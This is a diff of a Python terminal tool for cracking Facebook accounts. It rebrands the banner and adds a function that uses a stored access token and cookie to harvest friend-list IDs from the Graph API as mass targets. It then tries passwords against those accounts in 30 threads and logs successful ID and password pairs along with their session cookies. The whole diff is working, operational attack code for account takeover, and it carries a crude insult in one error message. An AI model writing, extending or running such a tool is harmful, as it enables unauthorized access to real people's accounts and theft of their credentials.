@@ -264,12 +264,21 @@ def animation(u):
 #------------------[ LOGO-HAMA ]-----------------#
 logo =""" 
 
-   d88b d8b   db  .d88b.  db   dD  .d8b.  
-   `8P' 888o  88 .8P  Y8. 88 ,8P' d8' `8b 
-    88  88V8o 88 88    88 88,8P   88ooo88 
-    88  88 V8o88 88    88 88`8b   88~~~88 
-db. 88  88  V888 `8b  d8' 88 `88. 88   88 
-Y8888P  VP   V8P  `Y88P'  YP   YD YP   YP 
+   __     __ 
+  / __/  \/ // / / ____/ //_/
+ / /   / /_/ / // /_/ /   / ,<   
+/ /_/ _, _/  / /_/ /| |  
+\__/_/_|_|/_/  \____/_/ |_|  
+   / __/  )                  
+  / /_  / __  |                  
+ / __/ / /_/ /                   
+/_/   /_/
+____________________________________
+TOOL CREATE BY + RaWa , SHAW💸
+VESION TOOL + 1.2✨👌
+NEW UPDATE😁
+____________________________________
+
                                           
                                           
 """
@@ -328,10 +337,13 @@ class jalan:
 def menu():
     os.system('clear')
     print(logo)
-    print('\033[97;1m''\x1b[1;91m[\x1b[1;92m1\x1b[1;91m] \x1b[1;93mCRACK FILE FAST\n\x1b[1;91m[\x1b[1;92m0\x1b[1;91m]\x1b[1;93m LOGAUT')
-    JNOKA  = input('\033[1;37mCHOOSE :  ')
+    print("\033[35;1m [ 1 ] CRACK FILE [ ON ]")
+    print("\033[35;1m [ 2 ] CRACK ID PUBLIC  [ ON ]")
+    JNOKA  = input('\033[1;36mOPTION :  ')
     if JNOKA in ['1']:
         JNOKA_FILE()
+    elif JNOKA in ['2','02']:
+	dump_massal()
     elif JNOKA in ['0']:
         os.system('rm -rf .token.txt')
         os.system('rm -rf .cookie.txt')        
@@ -344,7 +356,7 @@ def menu():
 #-------------[ CRACK-FROM-FILE ]------------------#
  
 def JNOKA_FILE():
-    o = input('\x1b[97;1m\x1b[1;94mNAME FILE\033[1;31m :\x1b[1;92m ')
+    o = input('\x1b[1;96m [😁] 𝐍𝐀𝐖𝐄 𝐅𝐈𝐋𝐄  : ')
     try:lin = open(o).read().splitlines()
     except:
         animation(' [×] FILE NOT FOUND')
@@ -353,12 +365,73 @@ def JNOKA_FILE():
     for xid in lin:
         id.append(xid)
     setting()
- 
+def dump_massal():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+		exit()
+	try:
+		jum = int(input(' How Many id : '))
+	except ValueError:
+		print('ERROR ')
+		exit()
+	if jum<1 or jum>100:
+		print(' Dump ID ')
+		exit()
+	ses=requests.Session()
+	yz = 0
+	for met in range(jum):
+		yz+=1
+		kl = input(' ID'+str(yz)+' : ')
+		uid.append(kl)
+	for user in uid:
+	    try:
+	       head = (
+	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
+	       })
+	       if len(id) == 0:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	          
+	       )
+	       else:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	           
+	       )
+	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
+	       for xr in url['friends']['data']:
+	           try:
+	               woy = (xr['id']+'|'+xr['name'])
+	               if woy in id:pass
+	               else:id.append(woy)
+	           except:continue
+	    except (KeyError,IOError):
+	      pass
+	    except requests.exceptions.ConnectionError:
+	        exit()
+	try:
+		print('')
+		print(f' Total IDs : {h}'+str(len(id)))
+		setting()
+	except requests.exceptions.ConnectionError:
+		print(f'{x}')
+		print('</> Sinyal Lo kek Kontol ')
+		back()
+	except (KeyError,IOError):
+		print(f'<•>{k} Pertemanan Tidak Public {x}')
+		time.sleep(3)
+		back()
 #-------------[ PENGATURAN-IDZ ]---------------#
  
 def setting():
-    print('\x1b[97;1m\x1b[1;93m[\x1b[1;91m1\x1b[1;93m] \x1b[1;92mMETHOD SUPORT OLD ID \n\x1b[1;93m[\x1b[1;91m2\x1b[1;93m] \x1b[1;92mMETHOD SUPORT NEW IDS \n\x1b[1;93m[\x1b[1;91m3\x1b[1;93m] \x1b[1;92mMETHOD SUPORT ALL IDS')
-    hu = input('\033[97;1m\033[92;1m\033[97;1mCHOOSE :\033[92;1m ')
+    print('\x1b[1;93m[ 3 ] RANDOM IDS 😁💸')
+    hu = input('\033[1;36mOPTION :  ')
     if hu in ['1','01']:
         for tua in sorted(id):
             id2.append(tua)
@@ -379,8 +452,8 @@ def setting():
         for bacot in id:
             xx = random.randint(0,len(id2))
             id2.insert(xx,bacot)
-    print('\x1b[97;1m\x1b[1;93m[\x1b[1;91m1\x1b[1;93m] \x1b[1;92mMETHOD SUPORT ALL INTARNET')
-    hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
+    print("\033[1;37m[ 1 ] MOBILE🗿")
+    hc = input('\033[1;36mOPTION :  ')
     if hc in ['1','01']:
         method.append('mobile')
     elif hc in ['2','02']:
@@ -394,9 +467,9 @@ def passwrd():
     os.system('clear')
     print(logo)
     print(50*'\033[1;97m-')
-    print('\033[1;96mTOTAL IDS 👉 \033[92;1m '+str(len(id)))
-    print("\033[1;96mCLONING HAS STARTED\x1b[0m")
-    print(f"\033[1;96mDATE  :  \033[1;92m{tgl} \033[1;91m{bln} \033[1;97m{thn}")
+    #print('\033[1;96mTOTAL IDS 👉 \033[92;1m '+str(len(id)))
+    #print("\033[1;96mCLONING HAS STARTED\x1b[0m")
+    #print(f"\033[1;96mDATE  :  \033[1;92m{tgl} \033[1;91m{bln} \033[1;97m{thn}")
     print(50*'\033[1;97m-')
     with tred(max_workers=30) as pool:
         for yuzong in id2:
@@ -467,7 +540,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r \r[JNOKA]  \033[1;30m[\033[1;32mOK\033[1;30m/\033[1;33mCP\033[1;30m] - \033[1;30m[\033[1;32m{ok}\033[1;30m/\033[1;33m{cp}\033[1;30m] \033[1;30m[\033[1;36mTEST\033[1;30m/\033[1;32m{loop}\033[1;30m]"),
+    sys.stdout.write(f"\r \033[1;37mRaWa-SHAW-B-APi ]\033[1;37m{Z}{b}{loop}{Z}|{b}{len(id)} \x1b[38;5;43m[\x1b[38;5;48mOK∙{ok}\x1b[38;5;43m] {P}{'{:.0%}'.format(loop/float(len(id)))}  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -517,7 +590,7 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[1;30m[\033[1;32mJNOKA-OK\033[1;30m]\033[1;32m   {idf} | \033[1;32m{pw}')
+                print(f'\r\033[0;92m[SHAW-RAWA-OK] {idf} • {pw}\n\033[0;93m[💸]= COOKIES • \033[0;92m{kuki} ')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 
                 break
